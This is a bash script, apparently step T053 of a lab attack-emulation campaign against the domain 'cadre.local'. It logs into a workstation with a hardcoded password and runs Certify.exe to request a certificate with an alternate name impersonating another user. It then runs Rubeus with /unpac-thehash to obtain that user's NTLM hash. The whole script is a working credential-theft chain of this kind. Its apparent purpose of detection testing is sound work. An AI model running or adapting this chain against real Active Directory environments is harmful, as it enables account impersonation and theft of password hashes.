#!/usr/bin/env bash
# T053 — UnPAC-the-hash from ws01 (analyst_t1) using Certify.exe
# Requests a cert with UPN for target user, then Rubeus /unpac-thehash.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T053-UNPAC-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T053 UnPAC-the-hash | ${CASE_ID} | T0=${T0} ==="

DC01="${DC01:-dc01.cadre.local}"
CA="${CA:-CADRE-CA-01.cadre.local\CADRE-CA-01}"
TARGET_USER="analyst_t2"

CMD='
$ErrorActionPreference = "Stop";
$c = "C:\Tools\cadre-attack\Certify.exe";
$r = "C:\Tools\cadre-attack\Rubeus.exe";
if (-not (Test-Path $c)) { throw "Certify.exe not found" }
if (-not (Test-Path $r)) { throw "Rubeus.exe not found" }
$cert = "C:\Users\analyst_t1\AppData\Local\Temp\cert.pfx";
& $c request /ca:"'''"${CA}"'''" /template:User /domain:"cadre.local" /dc:"'''"${DC01}"'''" /altname:"'''"${TARGET_USER}"'''" /out:$cert;
if (-not (Test-Path $cert)) { throw "cert.pfx not created" }
& $r asktgt /user:"'''"${TARGET_USER}"'''" /domain:cadre.local /dc:"'''"${DC01}"'''" /certificate:$cert /password:CertPass123 /unpac-thehash /nowrap;
Write-Output "T053_OK: UnPAC-the-hash attempt complete"
'

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T053 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T053 run complete ==="
